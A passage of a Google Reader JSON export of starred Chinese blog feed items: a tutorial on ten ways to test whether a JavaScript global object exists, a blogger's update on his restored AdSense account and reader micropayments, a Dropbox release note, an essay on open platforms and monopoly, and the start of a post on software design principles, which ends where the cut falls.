      "content" : "<p>Javascript语言的设计不够严谨，很多地方一不小心就会出错。</p><p>举例来说，请考虑以下情况。</p>\n\n<p>现在，我们要判断一个<strong>全局对象</strong>myObj是否存在，如果不存在，就对它进行声明。用自然语言描述的算法如下：</p>\n\n<blockquote>\n\n<p>　　if (myObj不存在){</p>\n\n<p>　　　　声明myObj;</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>你可能会觉得，写出这段代码很容易。但是实际上，它涉及的语法问题，远比我们想象的复杂。<a href=\"http://perfectionkills.com/unnecessarily-comprehensive-look-into-a-rather-insignificant-issue-of-global-objects-creation/\">Juriy Zaytsev</a>指出，判断一个Javascript对象是否存在，有超过50种写法。只有对Javascript语言的实现细节非常清楚，才可能分得清它们的区别。</p>\n\n<p><strong>第一种写法</strong></p>\n\n<p>根据直觉，你可能觉得可以这样写：</p>\n\n<blockquote>\n\n<p>　　if (!myObj) {</p>\n\n<p>　　　　myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>但是，运行这段代码，浏览器会直接抛出ReferenceError错误，导致运行中断。请问错在哪里？</p>\n\n<p>对了，if语句判断myObj是否为空时，这个变量还不存在，所以才会报错。改成下面这样，就能正确运行了。</p>\n\n<blockquote>\n\n<p>　　if (!myObj) {</p>\n\n<p>　　　　<strong>var myObj = { };</strong></p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>为什么加了一个var以后，就不报错了？难道这种情况下，if语句做判断时，myObj就已经存在了吗？</p>\n\n<p>要回答这个问题，就必须知道Javascript解释器的工作方式。Javascript语言是\"先解析，后运行\"，解析时就已经完成了变量声明，所以上面的代码实际等同于：</p>\n\n<blockquote>\n\n<p>　　<strong>var myObj;</strong></p>\n\n<p>　　if (!myObj) {</p>\n\n<p>　　　　var myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>因此，if语句做判断时，myObj确实已经存在了，所以就不报错了。这就是var命令的\"代码提升\"（hoisting）作用。Javascript解释器，只\"提升\"var命令定义的变量，对不使用var命令、直接赋值的变量不起作用，这就是为什么不加var会报错的原因。</p>\n\n<p><strong>第二种写法</strong></p>\n\n<p>除了var命令，还可以有另一种改写，也能得到正确的结果：</p>\n\n<blockquote>\n\n<p>　　<strong>if (!window.myObj) {</strong></p>\n\n<p>　　　　myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>window是javascript的顶层对象，所有的全局变量都是它的属性。所以，判断myobj是否为空，等同于判断window对象是否有myobj属性，这样就可以避免因为myObj没有定义而出现ReferenceError错误。不过，从代码的规范性考虑，最好还是对第二行加上var：</p>\n\n<blockquote>\n\n<p>　　if (!window.myObj) {</p>\n\n<p>　　　　<strong>var myObj = { };</strong></p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>或者写成这样：</p>\n\n<blockquote>\n\n<p>　　if (!window.myObj) {</p>\n\n<p>　　　　<strong>window.myObj = { };</strong></p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>第三种写法</strong></p>\n\n<p>上面这种写法的缺点在于，在某些运行环境中（比如V8、Rhino），window未必是顶层对象。所以，考虑改写成：</p>\n\n<blockquote>\n\n<p>　　if (!<strong>this.myObj</strong>) {</p>\n\n<p>　　　　<strong>this.myObj</strong> = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>在全局变量的层面中，this关键字总是指向顶层变量，所以就可以独立于不同的运行环境。</p>\n\n<p><strong>第四种写法</strong></p>\n\n<p>但是，上面这样写可读性较差，而且this的指向是可变的，容易出错，所以进一步改写：</p>\n\n<blockquote>\n\n<p>　　<strong>var global = this;</strong></p>\n\n<p>　　if (!global.myObj) {</p>\n\n<p>　　　　global.myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>用自定义变量global表示顶层对象，就清楚多了。</p>\n\n<p><strong>第五种写法</strong></p>\n\n<p>还可以使用typeof运算符，判断myObj是否有定义。</p>\n\n<blockquote>\n\n<p>　　if (<strong>typeof myObj == \"undefined\"</strong>) {</p>\n\n<p>　　　　var myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>这是目前使用最广泛的判断javascript对象是否存在的方法。</p>\n\n<p><strong>第六种写法</strong></p>\n\n<p>由于在已定义、但未赋值的情况下，myObj的值直接等于undefined，所以上面的写法可以简化：</p>\n\n<blockquote>\n\n<p>　　if (<strong>myObj == undefined</strong>) {</p>\n\n<p>　　　　var myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>这里有两个地方需要注意，首先第二行的var关键字不能少，否则会出现ReferenceError错误，其次undefined不能加单引号或双引号，因为这里比较的是undefined这种数据类型，而不是\"undefined\"这个字符串。</p>\n\n<p><strong>第七种写法</strong></p>\n\n<p>上面的写法在\"精确比较\"（===）的情况下，依然成立：</p>\n\n<blockquote>\n\n<p>　　if (<strong>myObj === undefined</strong>) {</p>\n\n<p>　　　　var myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>第八种写法</strong></p>\n\n<p>根据javascript的语言设计，undefined == null，所以比较myObj是否等于null，也能得到正确结果：</p>\n\n<blockquote>\n\n<p>　　if (<strong>myObj == null</strong>) {</p>\n\n<p>　　　　var myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>不过，虽然运行结果正确，但是从语义上看，这种判断方法是错的，应该避免。因为null指的是已经赋值为null的空对象，即这个对象实际上是有值的，而undefined指的是不存在或没有赋值的对象。因此，这里只能使用\"比较运算符\"（==），如果这里使用\"精确比较运算符\"（===），就会出错。</p>\n\n<p><strong>第九种写法</strong></p>\n\n<p>还可以使用in运算符，判断myObj是否为顶层对象的一个属性：</p>\n\n<blockquote>\n\n<p>　　<strong>if (!('myObj' in window)) {</strong></p>\n\n<p>　　　　window.myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>第十种写法</strong></p>\n\n<p>最后，使用hasOwnProperty方法，判断myObj是否为顶层对象的一个属性：</p>\n\n<blockquote>\n\n<p>　　<strong>if (!this.hasOwnProperty('myObj')) {</strong></p>\n\n<p>　　　　this.myObj = { };</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p><strong>总结</strong></p>\n\n<p>1. 如果只判断对象是否存在，推荐使用第五种写法。</p>\n\n<p>2. 如果除了对象是否存在，还要判断对象是否有null值，推荐使用第一种写法。</p>\n\n<p>3. 除非特殊情况，所有变量都应该使用var命令声明。</p>\n\n<p>4. 为了跨平台，建议避免使用window表示顶层对象。</p>\n\n<p>5. 在Javascript语言中，null和undefined容易产生混淆。在可能同时涉及两者的情况下，建议使用\"精确比较\"运算符（===）。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/05/how_to_judge_the_existence_of_a_global_object_in_javascript.html\">http://www.ruanyifeng.com/blog/2011/05/how_to_judge_the_existence_of_a_global_object_in_javascript.html</a></li>\n<li>最后修改时间：2011年5月13日 15:40</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011051700196144\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1306253815830",
    "timestampUsec" : "1306253815830714",
    "id" : "tag:google.com,2005:reader/item/63fa069c781ccca8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "My_Website" ],
    "title" : "我的Google Adsense帐户被关（续）",
    "published" : 1305817602,
    "updated" : 1305817602,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/05/google_adsense_continued.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>一、</p>\n\n<p>自从贴出<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\">前一篇文章</a>，已经过去72个小时了。</p><p>那篇文章引起很大的反响，完全出乎我的意料。很多事情接踵发生，令我不知所措。</p>\n\n<p>我的心情很矛盾，但是我想有些事情应该及时告诉大家。</p>\n\n<p>二、</p>\n\n<p>最大的事件，当然是昨天下午收到Google的邮件，宣布恢复我的Adsense帐户。</p>\n\n<blockquote>\n\n<p>\"您好！</p>\n\n<p>在对您的 AdSense 帐户进行全面的重新审核后，我们决定将其恢复。 不过，广告开始在您的网站上投放可能会有一定的延迟，因为我们所有的服务器收到更改通知可能需要最多 48 小时的时间。</p>\n\n<p>感谢您的耐心等待，对于任何不便之处，我们深表歉意。 如有任何疑问，请通过以下网址访问我们的支持中心。</p>\n\n<p>Google AdSense 小组敬上\"</p>\n\n</blockquote>\n\n<p>我高兴吗？</p>\n\n<p>不，我很沮丧。</p>\n\n<p>不管Google出于何种理由恢复我的帐户，都把我置于巨大的\"道德风险\"之中。本来，我是\"受害人\"，可是这样一来，我就成了\"利用他人的人\"。已经有好几个同样遭遇的朋友写信来，要求我代表大家，向Google总部写申诉抗议信，现在我怎么面对他们啊？另外，那些因为我遭受损失，而向我捐助的朋友会怎么想？</p>\n\n<p>印度诗人泰戈尔说过：</p>\n\n<blockquote>\n\n<p>\"感谢神，我不是一个权力的轮子，而是被压在这轮子下的活人之一。\"</p>\n\n</blockquote>\n\n<p>这一刻，我宁愿自己在轮子下面。</p>\n\n<p>三、</p>\n\n<p>短期内，我不会再使用Google Adsense了。</p>\n\n<p>我想把微支付的试验做下去。每篇文章0.99元的价格，读者自愿付费，我们看看一年后能收到多少钱。如果这个试验做得好，是可以被写进文献的。</p>\n\n<p>过去72小时内，我一共收到了1087.79元人民币，以及34.77元美元，共计287人次付款。谢谢大家。</p>\n\n<p>但是，我犯了一个愚蠢的错误：没有想到Paypal对每笔收款收取最低0.3美元的手续费。因此，我不得不暂时取消美元付款，并将所有的小额美元付款全额退回，请各位谅解。</p>\n\n<p>（更新：网友elver提醒我，Paypal有<a href=\"https://micropayments.paypal-labs.com/\">小额支付平台</a>，每次的手续费是付款金额的5%+$0.05。感谢他的提醒，美元付款重新恢复。2011年6月3日）</p>\n\n<p>四、</p>\n\n<p>此外，这里的广告位也有望全部卖出，很多朋友表示感兴趣。</p>\n\n<p>不过我发现，他们很多人其实不是为了打广告，而是为了补贴我，这个......</p>\n\n<p>我有一个信念：只要你让别人\"得到总比付出多\"，你就一定活得下去。所以，只要我的文章对读者有价值，我不信收不到钱。同样地，如果我把广告位卖给你，我就应该帮助你赚到更多。如果做不到，我会觉得自己不配拿这笔钱。</p>\n\n<p>我其实特别愿意推销<a href=\"http://tulingts.tmall.com\">图灵的淘宝店</a>，从我的网志进入的读者每买一本书，我就拿一笔提成费。图灵的书很合适我的网志，可惜我的建议没有得到回应。</p>\n\n<p>五、</p>\n\n<p>Google Adsense的事情就到此为止，我不会再写了。后面会贴几篇我学习编程的笔记，都是最近积累下来的。</p>\n\n<p><a href=\"http://www.ruanyifeng.com/blog/2011/05/900-month_lifespan.html\">人生只有900个月</a>。四月过去了，五月也过去了，我没有多少个月可以浪费了。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201105/bg2011051901.jpg\"></p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/05/google_adsense_continued.html\">http://www.ruanyifeng.com/blog/2011/05/google_adsense_continued.html</a></li>\n<li>最后修改时间：2011年6月 3日 14:16</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011051700196144\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1306253794655",
    "timestampUsec" : "1306253794655670",
    "id" : "tag:google.com,2005:reader/item/8ac18a3a72ca23f0",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "New Stable Build: 1.1.34",
    "published" : 1305849600,
    "updated" : 1305849600,
    "alternate" : [ {
      "href" : "http://forums.dropbox.com/topic.php?id=36538&36538",
      "type" : "text/html"
    } ],
    "related" : [ {
      "href" : "http://forums.dropbox.com/topic.php?id=36538"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<ul>\n  <li>Small bug fixes</li>\n</ul>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://www.dropbox.com/release_notes/rss.xml",
      "title" : "Dropbox Release Notes Feed",
      "htmlUrl" : "http://www.dropbox.com/release_notes"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1306253772881",
    "timestampUsec" : "1306253772881765",
    "id" : "tag:google.com,2005:reader/item/fe8dc3d2ed59b264",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "开放，开放，开放 —— 垄断",
    "published" : 1305857565,
    "updated" : 1305857565,
    "alternate" : [ {
      "href" : "http://weiwuhui.com/4271.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>很多年以前，微软有着巨大的麻烦：美国政府和19个州联合起诉它，因为它涉嫌利用垄断力量阻扼和打压竞争对手进入市场。事实上，微软在遭逢这个官司之前，windows系统就已经居于了垄断地位，以至于微软为了避免100%垄断的尴尬，在97年还投资了当时快要倒闭的苹果公司1亿5千万美元，以帮助麦金塔操作系统半死不活地陪着它在市场上玩。由于技术力量和产品受欢迎而形成的市场垄断地位并不是罪过，但一旦试图利用这个地位来阻挡竞争者就是罪过了：不正当竞争。微软利用win系统的普及，免费搭载的浏览器“IE”一举将网景击败，成为了这起官司的诱因。</p>\n<p>虽然微软最终逃过了被拆分的命运，但它的形象一直不太好，google崛起后，没几个人同情这个老去的王者，因为大家都认为它太霸道，而且其实很多产品都是买来的（包括最早期的DOS系统）而非自己创新。但不知道为什么，似乎没有人注意到，相比苹果的麦金塔系统，它可谓是早期的“开放平台”了：任何一个程序员或开发团队，都可以开发基于win系统运行的软件，或免费+广告，或直接收钱，微软从来不问。</p>\n<p>但就是这样一个“开放平台”，越多的人加入，就造成它的垄断态势越强。近来苹果虽然再度崛起，市值已经超过微软，但不得不承认的一点是，在桌面电脑领域，win系统的强悍依然稳如泰山。苹果并不是在桌面设备上翻身的，而是在移动设备上。即便google如日中天的时候，它也始终面临这样一个尴尬：google搜索再强，也得让用户经由win系统打开IE才能进入不是。</p>\n<p>Facebook可能是互联网最大最热闹的第三方开放平台，数十万应用在这个网站上被无数人使用着。它不仅把控着用户获取信息的第一渠道（就像当年的搜索引擎那样），甚至还做到了让用户虽然使用各种公司出品的应用却始终没有离开过Facebook网站——这已经几乎到了Facebook就是互联网本身的地步了。国内有一家公司在效仿这样的做法，就是百度的“框计算”——这也是一个所谓的开放平台。</p>\n<p>在百度中输入“小游戏”，第一映入你眼帘的就是3992个小游戏，分为38页呈现。点击任何一个小游戏，你都可以在不离开百度页面的情况下玩乐。这里有一点需要注意的是，虽然有3992个小游戏，但数字世界无论如何都不会只有这区区几千个。而且，通常用户也就点点第一页、第二页的小游戏（有些用户可能会去点第38页），但中间大量的小游戏，就被忽略了。</p>\n<p>这样的开放平台会造成两个后果：其一平台自身的垄断力越来越强，其二众多第三方应用呈现“强者恒强弱者恒弱”的马太效应。开放平台到此画出了一个极其诡异的图景：开放的走向，乃是垄断。而且这种垄断，是能够让后入市场者不俯首乖乖合作便无路可走的。</p>\n<p>最近腾讯启动了“Q+”开放平台，它的实质是将用户桌面侧边栏作为战场（而不是仅仅右下角了），但这个侧边栏腾讯本来就没有占领，故而乐得以一种“开放”的姿态，邀请天下数字公司共襄盛举。进入到这个侧边栏的应用显然是有限的，腾讯Q+嫌这点还不够，还可以让用户一键便从win系统桌面切换到它的Q+桌面。在这个桌面上，连windows经典的“开始”按钮都不见了，整个儿的QQ系统。</p>\n<p>开放平台的出现，意味着早期互联网精神的彻底终结。未来的竞争，将在两个层面上展开。巨头的平台之争以图吃肉，以及众多小公司在某个平台上斗殴不过是喝口汤。互联网最一开始那种平等游戏已经结束，随之而来，将会是“井然有序”的产业链金字塔。</p>\n<p>—— 刊发于《21世纪经济报道》当期专栏 ——</p>\n<p>可视为<a rel=\"nofollow\" href=\"http://www.weiwuhui.com/4269.html\">腾讯的Q计算</a>之姐妹作，以及<a rel=\"nofollow\" href=\"http://www.weiwuhui.com/4255.html\">开放平台：从单个企业到联盟企业到星云企业</a>的最后本人脚注。</p>\n<hr><small>Copyleft © 2010 知识共享署名-非商业性使用-禁止演绎 注意：转载勿改标题！<br>ItTalks -- 魏武挥的Blog (digitalfingerprint:fc4f8fc31f70097eea4b780b13146415)<br><br> 欢迎 浏览<a rel=\"nofollow\" href=\"http://infographic.weiwuhui.com\">我收集的信息图</a> 关注<a rel=\"nofollow\" href=\"http://t.sina.com.cn/weiwuhui\">我的微博</a> 访问<a rel=\"nofollow\" href=\"http://read.weiwuhui.com\">我的分享</a> </small><table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\"> <tr> <td colspan=\"4\"><b><font size=\"-1\" style=\"display:block;padding:20px 0 5px!important\">无觅猜您也喜欢：</font></b></td> </tr> <tr> <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\"> <a rel=\"nofollow\" title=\"开放平台：从单个企业到联盟企业到星云企业\" style=\"text-decoration:none\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fweiwuhui.com%2F4255.html&amp;from=http%3A%2F%2Fweiwuhui.com%2F4271.html\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/05/10/8131226.gif\" width=\"96px\" height=\"96px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block;line-height:15px!important;width:102px!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden\">开放平台：从单个企业到联盟企业到星云企业</font> </a> </td> <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a rel=\"nofollow\" title=\"腾讯的“Q计算”\" style=\"text-decoration:none\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fweiwuhui.com%2F4269.html&amp;from=http%3A%2F%2Fweiwuhui.com%2F4271.html\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block;line-height:15px!important;width:102px!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden\">腾讯的“Q计算”</font> </a> </td> <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a rel=\"nofollow\" title=\"开放是一个笑话\" style=\"text-decoration:none\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fweiwuhui.com%2F1326.html&amp;from=http%3A%2F%2Fweiwuhui.com%2F4271.html\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2010/11/23/1055886.png\" width=\"96px\" height=\"96px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block;line-height:15px!important;width:102px!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden\">开放是一个笑话</font> </a> </td> <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\"> <a rel=\"nofollow\" title=\"垄断之害\" style=\"text-decoration:none\" href=\"http://app.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fweiwuhui.com%2F2826.html&amp;from=http%3A%2F%2Fweiwuhui.com%2F4271.html\"> <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br> <font size=\"-1\" color=\"#333333\" style=\"display:block;line-height:15px!important;width:102px!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden\">垄断之害</font> </a> </td> </tr> <tr> <td colspan=\"4\" align=\"right\"> <a rel=\"nofollow\" style=\"text-decoration:none\" href=\"http://www.wumii.com/widget/relatedItems.htm\" title=\"无觅相关文章插件\"> <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb\">无觅</font> </a> </td> </tr>\n</table><h3>与本日志可能相关的文章有：</h3><ul><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4168.html\" title=\"新浪微博之重\">新浪微博之重</a> (14)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4269.html\" title=\"腾讯的“Q计算”\">腾讯的“Q计算”</a> (12)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4255.html\" title=\"开放平台：从单个企业到联盟企业到星云企业\">开放平台：从单个企业到联盟企业到星云企业</a> (7)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4250.html\" title=\"童年消逝：黄艺博事件\">童年消逝：黄艺博事件</a> (9)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4240.html\" title=\"信息传播：表意性？工具性？\">信息传播：表意性？工具性？</a> (2)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4230.html\" title=\"免费的逻辑\">免费的逻辑</a> (13)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4223.html\" title=\"隐私：社交网络几乎无解的问题\">隐私：社交网络几乎无解的问题</a> (11)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4212.html\" title=\"新浪：把自己给做小了\">新浪：把自己给做小了</a> (26)</li><li><a rel=\"nofollow\" href=\"http://weiwuhui.com/4200.html\" title=\"数字时代的著作权体系\">数字时代的著作权体系</a> (15)</li></ul><div>\n<a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?d=yIl2AUoC8zA\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?d=7Q72WNTAKBA\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?d=dnMXMwOfBR0\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:YwkR-u9nhCs\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?d=YwkR-u9nhCs\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?i=7PXGheHOmJc:aUQP60lM-cU:D7DqB2pKExk\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?i=7PXGheHOmJc:aUQP60lM-cU:F7zBnMyn0Lo\" border=\"0\"></a> <a rel=\"nofollow\" href=\"http://feeds.feedburner.com/~ff/ItTalks?a=7PXGheHOmJc:aUQP60lM-cU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/ItTalks?i=7PXGheHOmJc:aUQP60lM-cU:V_sGLiPBpWU\" border=\"0\"></a>\n</div>"
    },
    "author" : "魏武挥",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://editor.bullog.org/",
      "title" : "牛博山寨 编辑推荐",
      "htmlUrl" : "http://bullog.org/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1303861238170",
    "timestampUsec" : "1303861238170347",
    "id" : "tag:google.com,2005:reader/item/aef97b18a48f0bf3",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/like", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "程序设计", "Coding", "Design", "Object-Oriented", "Unix", "面向对象" ],
    "title" : "一些软件设计的原则",
    "published" : 1303691058,
    "updated" : 1303691058,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/4535.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>以前本站向大家介绍过一些软件开发的原则，比如<a title=\"优质代码的十诫\" rel=\"bookmark\" href=\"http://coolshell.cn/articles/1007.html\">优质代码的十诫</a>和<a title=\"Unix传奇(下篇)\" href=\"http://coolshell.cn/articles/2324.html\">Unix传奇(下篇)</a>中所以说的UNIX的设计原则。相信大家从中能够从中学了解到一些设计原理方面的知识，正如我在《<a title=\"再谈“我是怎么招聘程序员的”（上）\" href=\"http://coolshell.cn/articles/4506.html\">再谈“我是怎么招聘程序”</a>》中所说的，一个好的程序员通常由其操作技能、知识水平，经验层力和能力四个方面组成。在这里想和大家说说设计中的一些原则，我认为这些东西属于长期经验总结出来的知识。这些原则，每一个程序员都应该了解。但是请不要教条主义，在使用的时候还是要多多考虑实际情况。其实，<strong>下面这些原则，不单单只是软件开发，可以推广到其它生产活动中，甚至我们的生活中</strong>。</p>\n<h4>Don’t Repeat Yourself (DRY)</h4>\n<p>DRY 是一个最简单的法则，也是最容易被理解的。但它也可能是最难被应用的（因为要做到这样，我们需要在泛型设计上做相当的努力，这并不是一件容易的事）。它意味着，当我们在两个或多个地方的时候发现一些相似的代码的时候，我们需要把他们的共性抽象出来形一个唯一的新方法，并且改变现有的地方的代码让他们以一些合适的参数调用这个新的方法。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/Don%27t_repeat_yourself\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Don%27t_repeat_yourself\">http://en.wikipedia.org/wiki/Don%27t_repeat_yourself</a></p>\n<h4>Keep It Simple, Stupid (KISS)</h4>\n<p>KISS原则在设计上可能最被推崇的，在家装设计，界面设计 ，操作设计上，复杂的东西越来越被众人所BS了，而简单的东西越来越被人所认可，比如<a title=\"UI的恶梦\" href=\"http://coolshell.cn/articles/1907.html\">这些UI的设计</a>和我们<a title=\"为什么中国的网页设计那么烂？\" href=\"http://coolshell.cn/articles/3605.html\">中国网页</a>（尤其是<a title=\"微软用新浪来当反面教材\" 